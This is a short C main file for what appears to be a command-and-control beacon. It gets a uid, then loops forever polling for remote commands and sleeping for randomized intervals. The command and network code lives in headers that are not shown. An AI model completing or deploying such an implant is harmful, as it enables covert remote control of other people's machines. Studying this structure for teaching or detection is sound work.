#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include "base64.h"
#include "client.h"
#include "tasks.h"

int main() {
    // Initialize the decoding table
    build_decoding_table();
    
    // step 1 : get uid
    get_uid();
    
    while (1) {
        // step 2 : check tasks
        printf("\nVérification des commandes...\n");
        check_commands();
        
        // step 3 : sleep
        calculate_random_sleep_time();
        
        printf("Pause de %.2f secondes\n", sleep_time);
        sleep(sleep_time);
    }
    
    // cleaning
    base64_cleanup();
    return 0;
}